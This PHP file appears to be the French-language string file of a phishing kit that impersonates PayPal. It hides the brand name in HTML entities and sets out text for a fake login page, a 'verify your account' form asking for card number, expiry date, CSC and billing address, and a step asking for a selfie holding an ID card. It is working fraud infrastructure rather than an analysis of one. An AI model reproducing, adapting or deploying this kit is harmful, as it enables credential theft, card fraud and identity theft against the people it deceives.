<?php 

session_start();
error_reporting(0); 
/////////// INDEX LOGIN ///////////////////////////////////////////
$Z118_01 = "Connectez-vous à votre &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; compte";
$Z118_02 = "Email";
$Z118_03 = "Mot de passe";
$Z118_04 = "Adresse e-mail est nécessaire.";
$Z118_05 = "Mot de passe requis.";
$Z118_06 = "S'identifier";
$Z118_07 = "Vous avez des problèmes pour vous connecter?";
$Z118_08 = "S'inscrire";
$Z118_09 = "Confidentialité";
$Z118_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$Z118_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$Z118_12 = "Vérification de vos informations…";
$Z118_13 = "Certaines de vos informations ne sont pas correctes. Veuillez réessayer.";
/////////// INDEX BILLING/CARDING/SUCCESS //////////////////////////////////////////
$Z118_title         = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Garantie & Sécurité";
$Z118_securityLock  = "Votre sécurité est notre priorité absolue";
$Z118_verify        = "Vérifiez votre compte";
$Z118_pargraphe     = "Cher client, veuillez saisir correctement les informations de votre compte et les associer aux informations de votre carte.";
$Z118_update_card   = "Mettre à jour les informations de la carte";
$Z118_cardholder    = "Nom du titulaire";
$Z118_cardnumber    = "Numéro de carte";
$Z118_expdate       = "Date d'expiration";
$Z118_csc           = "CSC (3 chiffres)";
$Z118_update_bill   = "Mettre à jour l'adresse de facturation";
$Z118_fullname      = "Nom complet";
$Z118_address       = "Adresse";
$Z118_city          = "Ville";
$Z118_state         = "Pays";
$Z118_zipCode       = "code postal";
$Z118_mobile        = "Mobile";
$Z118_home          = "Fixe";
$Z118_phoneNumber   = "Numéro de téléphone";
$Z118_agree         = "En cliquant sur Accepter et continuer, j'ai lu et accepté &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; ";
$Z118_user_agrement = "Accord de l'utilisateur";
$Z118_privacy       = "Politique de confidentialité";
$Z118_and           = " et ";
$Z118_policy        = "Politique de livraison de communications électroniques";
$Z118_submit        = "Αccepter & Continuer";
$Z118_fPrivacy      = "confidentialité";
$Z118_flegal        = "Légal";
$Z118_fHelpCenter   = "Centre d'aide";
$Z118_success       = "félicitations !";
$Z118_successp      = "Cher ".$_SESSION['_fullname_'].", votre &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; compte a été vérifié avec succès. Vous serez automatiquement redirigé vers la page de connexion en 5 secondes.";
$Z118_billing       = "Information sur l'adresse de facturation";
$Z118_carding       = " Informations sur la carte";
/////////// INDEX CONFIRM IDENTITY ////////////////////////////////////////// 
$Z118_id_title      = "confirme ton identité";
$Z118_id_parag      = "Vos pièces d'identité nous aideront à valider votre identité.";
$Z118_id_ask        = "Ce que je devrais faire pour confirmer mon identité?";
$Z118_id_li_1       = "Prenez un selfie en tenant votre carte d’identité ainsi que votre ";
$Z118_id_li_2       = "Le nom du titulaire et la carte d'identité doivent correspondre et être clairement visibles.";
$Z118_id_li_3       = "Votre pièce d'identité doit être à côté de votre visage.";
$Z118_id_example    = "Voici un exemple d'image:";
?>
